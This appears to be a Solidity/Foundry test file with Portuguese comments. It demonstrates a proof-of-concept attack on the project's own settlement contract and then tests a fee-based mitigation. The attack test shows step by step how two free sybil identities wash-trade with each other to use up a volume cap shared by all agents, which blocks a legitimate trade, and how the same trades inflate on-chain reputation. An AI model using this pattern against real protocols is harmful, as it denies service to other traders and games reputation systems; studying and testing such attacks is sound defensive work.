// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../contracts/Registry.sol";
import "../contracts/Settlement.sol";
import "./mocks/MockERC20.sol";
import "./mocks/MockOracle.sol";

/// PoC: um único atacante controla duas identidades de agente "sybil" (registro é
/// livre e sem custo) e usa wash trading entre elas para (a) esgotar o teto de
/// volume por janela de um token compartilhado por TODOS os agentes, negando
/// negociação a um par legítimo e não relacionado, e (b) inflar a métrica de
/// reputação on-chain (successfulFills) sem risco econômico real.
contract SettlementAttackTest is Test {
    Registry registry;
    Settlement settlement;
    MockERC20 weth; // 18 casas
    MockERC20 usdc; // 6 casas
    MockOracle oracle; // ETH/USD, 8 casas

    uint256 makerKey;
    uint256 takerKey;
    address maker; // agente legítimo, sem relação com o atacante
    address taker; // agente legítimo, sem relação com o atacante

    uint256 attackerMakerKey;
    uint256 attackerTakerKey;
    address attackerMaker; // sybil #1, mesmo dono (atacante)
    address attackerTaker; // sybil #2, mesmo dono (atacante)

    uint256 constant ETH_PRICE = 2000e8;

    function setUp() public {
        (maker, makerKey) = makeAddrAndKey("maker");
        (taker, takerKey) = makeAddrAndKey("taker");
        (attackerMaker, attackerMakerKey) = makeAddrAndKey("attackerMaker");
        (attackerTaker, attackerTakerKey) = makeAddrAndKey("attackerTaker");

        registry = new Registry();
        settlement = new Settlement(address(registry));
        registry.setSettlement(address(settlement));

        weth = new MockERC20("Wrapped Ether", "WETH", 18);
        usdc = new MockERC20("USD Coin", "USDC", 6);
        oracle = new MockOracle(int256(ETH_PRICE), 8);

        // agentes legítimos
        vm.prank(maker);
        registry.registerAgent(maker, "ipfs://maker");
        vm.prank(taker);
        registry.registerAgent(taker, "ipfs://taker");

        // sybils do atacante — registro é livre, sem KYC, sem custo além de gas;
        // msg.sender é a única "prova" exigida, e o atacante pode gerar quantas
        // chaves quiser
        vm.prank(attackerMaker);
        registry.registerAgent(attackerMaker, "ipfs://sybil1");
        vm.prank(attackerTaker);
        registry.registerAgent(attackerTaker, "ipfs://sybil2");

        weth.mint(maker, 1_000e18);
        usdc.mint(taker, 1_000_000e6);

        // o atacante só precisa ter WETH/USDC sob seu próprio controle — nada é
        // "gasto" de fato, o valor só circula entre as duas identidades dele
        weth.mint(attackerMaker, 10e18);
        usdc.mint(attackerTaker, 20_000e6);

        vm.prank(maker);
        weth.approve(address(settlement), type(uint256).max);
        vm.prank(taker);
        usdc.approve(address(settlement), type(uint256).max);
        vm.prank(attackerMaker);
        weth.approve(address(settlement), type(uint256).max);
        vm.prank(attackerTaker);
        usdc.approve(address(settlement), type(uint256).max);

        settlement.setPriceOracle(address(weth), address(usdc), address(oracle));
        settlement.setTradingEnabled(true);
    }

    function _quote(address mk, address makerToken, address takerToken, uint256 makerAmount, uint256 takerAmount, uint256 nonce)
        internal
        view
        returns (Settlement.Quote memory)
    {
        return Settlement.Quote({
            maker: mk,
            taker: address(0),
            makerToken: makerToken,
            takerToken: takerToken,
            makerAmount: makerAmount,
            takerAmount: takerAmount,
            expiry: block.timestamp + 1 hours,
            nonce: nonce
        });
    }

    function _sign(uint256 pk, Settlement.Quote memory q) internal view returns (bytes memory) {
        bytes32 digest = settlement.hashQuote(q);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
        return abi.encodePacked(r, s, v);
    }

    /// Demonstra: o teto de volume por janela é por TOKEN (não por par de agente),
    /// e é compartilhado por todo mundo. Um atacante que só negocia consigo mesmo
    /// (via duas identidades sybil, de custo zero) consegue esgotar sozinho o teto
    /// diário de WETH e bloquear um trade legítimo e não relacionado.
    function test_Attack_SybilWashTradingExhaustsSharedVolumeCap_DoSLegitTrade() public {
        // teto diário de 2 WETH pro token — plausível pra um MVP em early-stage
        settlement.setMaxVolumePerWindow(address(weth), 2e18);

        // --- vítima prepara um trade legítimo e justo dentro do teto ---
        Settlement.Quote memory victimQuote = _quote(maker, address(weth), address(usdc), 1e18, 2000e6, 1);
        bytes memory victimSig = _sign(makerKey, victimQuote);

        // --- atacante esgota o teto ANTES da vítima, wash-trading consigo mesmo ---
        for (uint256 i = 0; i < 2; i++) {
            Settlement.Quote memory washQuote =
                _quote(attackerMaker, address(weth), address(usdc), 1e18, 2000e6, i + 1);
            bytes memory washSig = _sign(attackerMakerKey, washQuote);
            vm.prank(attackerTaker);
            settlement.fillQuote(washQuote, washSig); // preço exato do oráculo, passa fácil
        }

        assertEq(settlement.volumeInWindow(address(weth)), 2e18, "teto ja consumido pelo atacante");

        // --- a vítima, que nunca interagiu com o atacante, é bloqueada ---
        vm.prank(taker);
        vm.expectRevert("Settlement: token volume cap exceeded");
        settlement.fillQuote(victimQuote, victimSig);

        // --- e o "custo" do ataque pro atacante foi só gas: o WETH que saiu de
        // attackerMaker voltou pro controle do mesmo atacante via attackerTaker ---
        assertEq(weth.balanceOf(attackerTaker), 2e18);
        assertEq(weth.balanceOf(attackerMaker), 8e18); // 10e18 - 2e18, ainda do atacante

        // --- e de brinde, a reputação on-chain dos dois sybils subiu, de graça ---
        (,,,, uint64 attackerMakerFills) = registry.agents(attackerMaker);
        (,,,, uint64 attackerTakerFills) = registry.agents(attackerTaker);
        assertEq(attackerMakerFills, 2);
        assertEq(attackerTakerFills, 2);
    }

    /// Mitigação: com a taxa configurada (padrão Uniswap, cobrada no lado que o taker
    /// paga), o mesmo wash trading deixa de ser "só gas" — o atacante perde valor real
    /// pra treasury a cada rodada, mesmo controlando as duas identidades.
    function test_Mitigation_FeeMakesWashTradingCostReal() public {
        address treasury = makeAddr("treasury");
        settlement.setFeeRecipient(treasury);
        settlement.setFeeBps(30); // 0,3%, padrão Uniswap
        settlement.setMaxVolumePerWindow(address(weth), 2e18);

        uint256 attackerWethBefore = weth.balanceOf(attackerMaker) + weth.balanceOf(attackerTaker);
        uint256 attackerUsdcBefore = usdc.balanceOf(attackerMaker) + usdc.balanceOf(attackerTaker);

        for (uint256 i = 0; i < 2; i++) {
            Settlement.Quote memory washQuote =
                _quote(attackerMaker, address(weth), address(usdc), 1e18, 2000e6, i + 1);
            bytes memory washSig = _sign(attackerMakerKey, washQuote);
            vm.prank(attackerTaker);
            settlement.fillQuote(washQuote, washSig);
        }

        uint256 attackerWethAfter = weth.balanceOf(attackerMaker) + weth.balanceOf(attackerTaker);
        uint256 attackerUsdcAfter = usdc.balanceOf(attackerMaker) + usdc.balanceOf(attackerTaker);

        // o WETH combinado do atacante não muda (só circula entre as duas identidades dele)...
        assertEq(attackerWethAfter, attackerWethBefore);
        // ...mas o USDC combinado dele diminui: a taxa saiu de verdade do bolso do atacante
        assertLt(attackerUsdcAfter, attackerUsdcBefore);

        uint256 expectedFee = 2 * ((2000e6 * 30) / 10000); // 2 trades x 0,3% de 2000 USDC
        assertEq(usdc.balanceOf(treasury), expectedFee);
        assertEq(attackerUsdcBefore - attackerUsdcAfter, expectedFee);
    }
}
